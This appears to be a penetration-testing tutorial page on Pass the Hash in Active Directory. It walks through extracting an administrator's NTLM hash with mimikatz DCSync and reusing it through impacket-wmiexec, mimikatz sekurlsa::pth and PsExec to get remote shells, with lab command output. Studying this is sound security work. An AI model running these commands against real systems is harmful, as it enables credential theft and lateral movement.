---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Pass The Hash

In an Active Directory environment, **Pass the Hash** (**PtH**) technique allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the user's plaintext password.

Note that this will _only work for servers or services using NTLM authentication_, not for servers or services using Kerberos authentication. This lateral movement sub-technique is also mapped in the MITRE Framework under the [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) general technique.

This method bypasses the need to crack or steal plaintext passwords. By intercepting or obtaining the hashed password from a compromised system, the attacker can then use it to authenticate and gain access to other systems within the Active Directory domain. This technique exploits the inherent trust relationship established between systems using the same credentials, allowing attackers to move laterally across the network without needing to know the actual passwords.

Many third-party tools and frameworks use PtH to allow users to both authenticate and obtain code execution, including:

* Metasploit's [PSExec module](https://www.offsec.com/metasploit-unleashed/psexec-pass-hash/)
* [Passing-the-hash toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
* [Impacket](https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py)

The mechanics behind them all are more or less the same in that the attacker connects to the victim using the SMB and performs authentication using the [NTLM hash](https://msdn.microsoft.com/en-us/library/windows/desktop/aa365234\(v=vs.85\).aspx).

Most tools that are built to abuse PtH can be leveraged to start a Windows service (for example, `cmd.exe` or an instance of PowerShell) and communicate with it using [Named Pipes](https://msdn.microsoft.com/en-us/library/windows/desktop/aa365590\(v=vs.85\).aspx). This is done using the [Service Control Manager](https://msdn.microsoft.com/en-us/library/windows/desktop/ms685150\(v=vs.85\).aspx) API.

## Requirements

Similar to [PsExec](psexec.md) there are some prerequisites to using PtH:

1. Requires the ability to make an SMB connection through the firewall (commonly port 445)
2. [Windows File and Printer Sharing](https://www.majorgeeks.com/content/page/how\_to\_turn\_on\_or\_off\_file\_and\_printer\_sharing\_in\_windows\_10.html) feature must be enabled on the victim machine
3. [`ADMIN$`](https://attack.mitre.org/techniques/T1021/002/) share must be enabled on the remote machine
   * To establish a connection to this share, the attacker must present valid credentials **with local administrative permissions** (i.e. on the remote machine)

These requirements are often met in an internal network environment provided the attacker is able to obtain (hashed) credentials with some administrative privileges.

Note that PtH uses the NTLM hash legitimately. However, the vulnerability lies in the fact that we gained unauthorized access to the password hash of a local administrator.

## Example Background

The example is just showing tools for passing the hash. Extraction of the hash was covered in other modules. For this example assume the attacker has gained access to the domain administrators (user `corp\Administrator`) NTLM hash via a [DC Sync attack](../authentication/attacking-ad-authentication/dc-sync.md):

```shell-session
mimikatz # lsadump::dcsync /user:corp\Administrator
...
Credentials:
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
...
```

The hash is copied below:

```
2892d26cdf84d7a70e2eb3b9f05c425e
```

## Impacket

[`wmiexec`](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py) from the [Impacket suite](https://github.com/fortra/impacket/tree/master) allows attackers to conduct a PtH attack from their own machine. The command structure is:

```bash
impacket-wmiexec -hashes :hash user@machine
```

* The hash is appended to a colon&#x20;

For example to use the hash above to connect to `FILES04` (`192.168.x.73`) the command would be:

{% code overflow="wrap" %}
```bash
impacket-wmiexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e Administrator@192.168.246.73
```
{% endcode %}

When run this launches an interactive session:

```shell-session
kali@kali:~$ impacket-wmiexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e Administrator@192.168.246.73       
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
FILES04

C:\>whoami
files04\administrator

C:\>
```

If the target is sitting inside a victim network and is only accessible from inside the pivoting techniques [covered earlier](../../../attack-vectors/port-forwarding-and-tunneling/) can still allow the attacker to use `wmiexec`.

## Mimikatz

As with most things, Mimikatz can also do PtH. Assuming the attacker has Admin access to a machine they can run Mimikatz then, after running `privilege::debug`, use the `sekurlsa::pth` command to conduct the attack. The command structure is:

{% code overflow="wrap" %}
```
sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e
```
{% endcode %}

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e
user    : Administrator
domain  : corp.com
program : cmd.exe
impers. : no
NTLM    : 2892d26cdf84d7a70e2eb3b9f05c425e
  |  PID  1116
  |  TID  6024
  |  LSA Process is now R/W
  |  LUID 0 ; 2132538 (00000000:00208a3a)
  \_ msv1_0   - data copy @ 000001940FC24450 : OK !
  \_ kerberos - data copy @ 000001940FC9D4A8
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 000001940FD60AA8 (32) -> null
```

When run, a new command prompt opens with the assumed credentials. This can then be used to run things like [`PsExec`](psexec.md) to open a session to the desired target:

```shell-session
C:\Tools>.\PsExec64.exe \\FILES04 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
FILES04

C:\Windows\system32>whoami
corp\administrator
```
